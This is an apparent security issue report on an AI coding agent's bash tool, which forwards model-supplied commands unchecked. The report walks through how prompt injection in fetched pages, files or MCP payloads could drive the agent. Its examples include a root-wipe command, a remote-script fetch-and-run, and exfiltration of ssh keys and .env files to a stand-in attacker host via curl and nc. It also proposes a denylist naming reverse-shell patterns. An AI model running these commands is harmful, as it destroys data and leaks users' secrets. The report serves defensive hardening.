title: Bash tool: no command allowlist/denylist — model can rm -rf /, curl | sh, exfiltrate secrets
description:
Steps to reproduce:
1. 

Expected: 
Actual: 

**Dimension:** Security and Access (Input Handling, Least Privilege)

**Location:** /home/doll/OpenClaudia/src/tools/bash/mod.rs lines 309-389 (execute_bash), 48-164 (spawn background)

**Violation:**
execute_bash forwards the model-supplied 'command' argument straight to bash -c with ZERO allowlist, denylist, dangerous-verb filtering, or env scrubbing. A malicious prompt-injection from any tool output (web_fetch of a poisoned page, read_file of a poisoned source, MCP tool payload) can achieve arbitrary RCE with the OpenClaudia user's full privileges. Concrete attack vectors observable from the present code: (a) 'rm -rf --no-preserve-root /'; (b) 'curl http://attacker/x.sh | bash'; (c) 'cat ~/.ssh/id_rsa | curl -d @- http://attacker/'; (d) 'find / -name "*.env" -exec cat {} + | nc attacker 4444'; (e) environment variables like ANTHROPIC_API_KEY are inherited unscrubbed into the child bash. There is a 'guardrails' blast-radius check on file paths (write.rs:43, edit.rs:56) but NO equivalent for bash commands. Permission checks exist via check_tool_permission (mod.rs:974) but nothing in the bash path validates the command string itself.

**Mandated Refactor:**
1. Introduce a CommandPolicy in src/permissions.rs with three layers:
   - Hard denylist of irrecoverable or exfiltration verbs: rm -rf /, dd of=/dev/, mkfs, > /dev/sd*, chmod -R 777, curl|bash, wget|sh, nc -e, bash -i > /dev/tcp/, ssh-keygen -R *, etc.
   - Resource/path confinement: reject commands that reference paths outside the project root unless explicitly allowlisted (reuse the logic in guardrails::check_file_access).
   - Env scrubbing: .env_clear() then re-populate ONLY PATH, HOME, USER, LANG; strip ANTHROPIC_API_KEY, OPENAI_API_KEY, AWS_*, TAVILY_API_KEY, BRAVE_API_KEY.
2. Parse the command with shell-words or shlex before dispatch; reject if any token resolves to an absolute path under /etc, /root, /sys, /proc (selfreferential refs), or writes to /dev.
3. Short-circuit the bash tool entirely when permission_mgr.check('bash', &args) returns NeedsPrompt — current code only prompts via caller (proxy.rs) but TUI flows can silently auto-allow. Enforce a default 'deny-and-prompt' posture.
4. Add cap on command length (e.g. 4 KiB) — presently unbounded.
5. Add rlimit via unshare/prlimit for CPU/memory on Unix, job objects on Windows, so a fork-bomb or 'yes | head -c 100G' cannot DoS the host.
